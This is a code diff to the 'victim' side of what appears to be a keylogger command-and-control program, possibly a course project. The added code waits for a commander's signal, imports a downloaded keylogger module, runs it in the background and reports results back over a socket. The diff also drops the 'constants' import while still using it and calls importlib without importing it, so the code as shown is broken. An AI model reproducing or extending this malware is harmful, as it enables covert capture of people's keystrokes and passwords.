@@ -1,6 +1,8 @@
 import os
+import queue
 import socket
-import constants
+import threading
+
 from victim_utils import *
 
 if __name__ == '__main__':
@@ -11,7 +13,7 @@ if __name__ == '__main__':
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     # Define the server address and port
-    server_address = ('localhost', 8888)
+    server_address = ('localhost', 8887)
 
     # Bind the socket to the server address and port
     server_socket.bind(server_address)
@@ -53,12 +55,42 @@ if __name__ == '__main__':
                         # Create the full path to the file by joining the directory and file name
                         file_path = os.path.join(current_directory, file_name)
 
-                        # Check if the file exists, then start keylogger
+                        # Check if the file exists
                         if os.path.exists(file_path):
                             print(constants.FILE_FOUND_MSG.format(file_name))
-                            status = client_socket.send(constants.STATUS_TRUE.encode())
-                            msg = client_socket.send(constants.FILE_FOUND_MSG_TO_COMMANDER.format(file_name).encode())
+                            client_socket.send(constants.STATUS_TRUE.encode())
+                            client_socket.send(constants.FILE_FOUND_MSG_TO_COMMANDER.format(file_name).encode())
 
+                            # Await signal to start
+                            signal_start = client_socket.recv(1024).decode()
+
+                            # Start Keylogger
+                            if signal_start == constants.START_KEYLOG_MSG:
+                                print(constants.EXECUTE_KEYLOG_MSG.format(file_name))
+                                client_socket.send(constants.EXECUTE_KEYLOG_MSG_TO_CMDR.format(file_name).encode())
+                                module_name = file_name[:(len(file_name)) - 3]
+
+                                # Set global signal and start a thread to watch (prevents recv() blocking)
+                                signal_queue = queue.Queue()
+                                watcher_thread = threading.Thread(target=watch_signal, args=(client_socket,
+                                                                                             signal_queue,))
+                                watcher_thread.daemon = True
+                                watcher_thread.start()
+
+                                # Check if able import downloaded keylogger module
+                                if is_importable(module_name):
+                                    keylogger = importlib.import_module(module_name)
+                                    file_name = keylogger.main(signal_queue)
+
+                                    # Ensure thread closes and does not stall program
+                                    watcher_thread.join()
+
+                                    print(constants.KEYLOG_SUCCESS_MSG.format(file_name))
+                                    client_socket.send(constants.STATUS_TRUE.encode())
+                                    client_socket.send(constants.KEYLOG_SUCCESS_MSG_TO_CMDR.format(file_name).encode())
+                                else:
+                                    client_socket.send(constants.STATUS_FALSE.encode())
+                                    client_socket.send(constants.FAILED_IMPORT_MSG.format(module_name).encode())
 
                         else:
                             print(constants.FILE_NOT_FOUND_ERROR.format(file_name))
